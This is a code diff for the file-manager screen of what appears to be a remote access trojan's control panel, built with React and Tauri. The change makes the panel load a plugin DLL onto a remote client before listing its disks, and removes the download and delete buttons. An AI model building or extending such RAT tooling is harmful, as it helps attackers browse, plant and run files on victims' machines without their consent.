@@ -1,4 +1,4 @@
-import { useEffect, useState, useRef } from "react";
+import { useEffect, useState, useRef, useContext } from "react";
 import { useParams } from "react-router-dom";
 import { FileType } from "../../types";
 import {
@@ -6,9 +6,11 @@ import {
   manageFileCmd,
   uploadAndExecute,
   executeFile,
+  executePlugin,
 } from "../rat/RATCommands";
 import { listen } from "@tauri-apps/api/event";
 import { open } from "@tauri-apps/plugin-dialog";
+import { RATContext } from "../rat/RATContext";
 import {
   IconFolderFilled,
   IconFileFilled,
@@ -53,40 +55,11 @@ export const FileManager = () => {
   const foldersRef = useRef<HTMLDivElement>(null);
   const contextMenuRef = useRef<HTMLDivElement>(null);
 
-  function fileActions(type: string, fileName: string) {
-    if (type === "file")
-      return (
-        <div className="flex flex-row gap-1 justify-center w-full">
-          <button
-            className="cursor-pointer px-2 py-1 bg-secondarybg text-gray-200 hover:bg-accentx hover:text-white border border-gray-700 rounded flex items-center gap-1 text-xs font-medium transition-colors"
-            onClick={(e) => {
-              e.stopPropagation();
-              manageFile("download_file", fileName);
-            }}
-            title="Download File"
-          >
-            <IconDownload size={14} />
-            <span className="hidden sm:inline">Download</span>
-          </button>
-
-          <button
-            className="cursor-pointer px-2 py-1 bg-red-900 text-white hover:bg-red-700 rounded flex items-center gap-1 text-xs font-medium transition-colors"
-            onClick={(e) => {
-              e.stopPropagation();
-              manageFile("remove_file", fileName);
-            }}
-            title="Delete File"
-          >
-            <IconTrash size={14} />
-            <span className="hidden sm:inline">Delete</span>
-          </button>
-        </div>
-      );
-    return null;
-  }
-
   useEffect(() => {
-    invoke("read_files", { addr, run: "available_disks", path: "disks" });
+    executePlugin(addr, "file_manager", "target/release/file_manager.dll");
+    setTimeout(() => {
+      invoke("read_files", { addr, run: "available_disks", path: "disks" });
+    }, 500);
   }, []);
 
   useEffect(() => {
@@ -184,24 +157,18 @@ export const FileManager = () => {
 
     if (selected && !Array.isArray(selected)) {
       try {
-        // Read the file content
         const fileData = await invoke("read_file_for_upload", {
           filePath: selected,
         });
 
-        // Get just the filename from the path
         const fileName = selected.split(/[\\\/]/).pop();
 
-        // Send the file to the client
         await invoke("upload_file_to_folder", {
           addr,
           targetFolder: path,
           fileName,
           fileData,
         });
-
-        // Refresh the directory after upload
-        await readFilesCmd(addr, "view_dir", path.split("\\").pop() || "");
       } catch (error) {
         console.error("Failed to upload file:", error);
         alert("Failed to upload file: " + error);
